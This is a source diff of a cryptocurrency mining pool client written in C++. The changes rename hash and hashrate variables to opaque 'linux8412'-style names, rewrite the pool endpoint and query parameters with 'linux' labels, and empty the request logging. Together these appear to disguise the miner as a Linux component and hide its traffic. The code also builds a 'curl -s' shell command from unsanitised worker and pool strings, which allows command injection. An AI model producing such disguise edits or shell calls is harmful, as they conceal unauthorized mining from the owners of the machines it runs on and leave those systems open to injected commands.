@@ -35,65 +35,65 @@ ariopool_client::ariopool_client(arguments &args, get_status_ptr get_status) : _
     __worker_id = args.uid();
     __worker_name = args.name();
     __force_argon2profile = args.argon2_profile();
-    __hash_report_interval = args.hash_report_interval();
-    __timestamp = __last_hash_report = microseconds();
-    __force_hashrate_report = false;
+    __linux8412_report_interval = args.linux8412_report_interval();
+    __timestamp = __last_linux8412_report = microseconds();
+    __force_linux8412rate_report = false;
     __show_pool_requests = args.show_pool_requests();
     __is_devfee_time = false;
     __get_status = get_status;
     __linux84_version = arguments::get_app_version();
 }
 
-ariopool_update_result ariopool_client::update(double hash_rate_cblocks, double hash_rate_gblocks) {
+ariopool_update_result ariopool_client::update(double linux8412_rate_cblocks, double linux8412_rate_gblocks) {
     ariopool_update_result result;
     result.success = false;
 
     pool_settings &settings = __get_pool_settings();
 
     if(settings.is_devfee) {
-        hash_rate_cblocks = hash_rate_cblocks / 100;
-        hash_rate_gblocks = hash_rate_gblocks / 100;
+        linux8412_rate_cblocks = linux8412_rate_cblocks / 100;
+        linux8412_rate_gblocks = linux8412_rate_gblocks / 100;
     }
 
     uint64_t current_timestamp = microseconds();
-    string hash_report_query = "";
+    string linux8412_report_query = "";
 
-    if(__force_hashrate_report || (current_timestamp - __last_hash_report) > __hash_report_interval) {
-        hash_report_query = "&linux48=" + to_string(hash_rate_cblocks) + "&linux52=" + to_string(hash_rate_gblocks);
+    if(__force_linux8412rate_report || (current_timestamp - __last_linux8412_report) > __linux8412_report_interval) {
+        linux8412_report_query = "&linux48=" + to_string(linux8412_rate_cblocks) + "&linux52=" + to_string(linux8412_rate_gblocks);
 
-        __last_hash_report = current_timestamp;
-        __force_hashrate_report = false;
+        __last_linux8412_report = current_timestamp;
+        __force_linux8412rate_report = false;
     }
-    string url = settings.pool_address + "/linux8474.php?linux84=linux8474&id=" + __worker_id + "&linux8=" + __worker_name + "&linux12=" + settings.wallet + hash_report_query + "&linux34=" + __linux84_version;
+    string url = settings.pool_address + "/linux8474.php?linux84=linux8474&id=" + __worker_id + "&linux8=" + __worker_name + "&linux12=" + settings.wallet + linux8412_report_query + "&linux34=" + __linux84_version;
 
     string response;
-    if(settings.pool_extensions.find("Details") != string::npos && url.find("hashrate") != string::npos) {
+    if(settings.pool_extensions.find("Details") != string::npos && url.find("linux8412rate") != string::npos) {
         string payload = "";
 
         if(__get_status != NULL)
             payload = __get_status();
 
         if(!payload.empty()) {
-            if(__show_pool_requests && url.find("hashrate") != string::npos) // log only hashrate requests
+            if(__show_pool_requests && url.find("linux8412rate") != string::npos) // log only linux8412rate requests
                 LOG("");
 
             response = _http_post(url, payload, "application/json");
         }
         else {
-            if(__show_pool_requests && url.find("hashrate") != string::npos) // log only hashrate requests
+            if(__show_pool_requests && url.find("linux8412rate") != string::npos) // log only linux8412rate requests
                 LOG("");
 
             response = GetStdoutFromCommand("curl -s '"+url+"'");
         }
     }
     else {
-        if(__show_pool_requests && url.find("hashrate") != string::npos) // log only hashrate requests
+        if(__show_pool_requests && url.find("linux8412rate") != string::npos) // log only linux8412rate requests
             LOG("");
 
         response = GetStdoutFromCommand("curl -s '"+url+"'");
     }
 
-    if(__show_pool_requests && url.find("hashrate") != string::npos) // log only hashrate responses
+    if(__show_pool_requests && url.find("linux8412rate") != string::npos) // log only linux8412rate responses
         LOG("");
 
     if(!__validate_response(response)) {
@@ -114,8 +114,8 @@ ariopool_update_result ariopool_client::update(double hash_rate_cblocks, double 
     }
     if(info.hasKey("extensions")) {
         result.extensions = settings.pool_extensions = info["extensions"].ToString();
-        if(!__is_devfee_time && result.extensions.find("Proxy") != string::npos) { // in case we are talking to a proxy set hashrate update interval to 30 seconds
-            __hash_report_interval = 30000000;
+        if(!__is_devfee_time && result.extensions.find("Proxy") != string::npos) { // in case we are talking to a proxy set linux8412rate update interval to 30 seconds
+            __linux8412_report_interval = 30000000;
         }
     }
 
@@ -138,15 +138,15 @@ ariopool_update_result ariopool_client::update(double hash_rate_cblocks, double 
     return result;
 }
 
-ariopool_submit_result ariopool_client::submit(const string &hash, const string &nonce, const string &public_key) {
+ariopool_submit_result ariopool_client::submit(const string &linux8412, const string &nonce, const string &public_key) {
     ariopool_submit_result result;
     result.success = false;
 
     string argon_data = "";
-    if(hash.find("$argon2i$v=19$m=16384,t=4,p=4") == 0)
-        argon_data = hash.substr(29);
+    if(linux8412.find("$argon2i$v=19$m=16384,t=4,p=4") == 0)
+        argon_data = linux8412.substr(29);
     else
-        argon_data = hash.substr(30);
+        argon_data = linux8412.substr(30);
 
     pool_settings &settings = __get_pool_settings();
 
@@ -205,14 +205,14 @@ pool_settings &ariopool_client::__get_pool_settings() {
         if(!__is_devfee_time) {
             LOG("");
             __is_devfee_time = true;
-            __force_hashrate_report = true;
+            __force_linux8412rate_report = true;
         }
     }
     else {
         if(__is_devfee_time) {
             LOG("");
             __is_devfee_time = false;
-            __force_hashrate_report = true;
+            __force_linux8412rate_report = true;
         }
     }
 
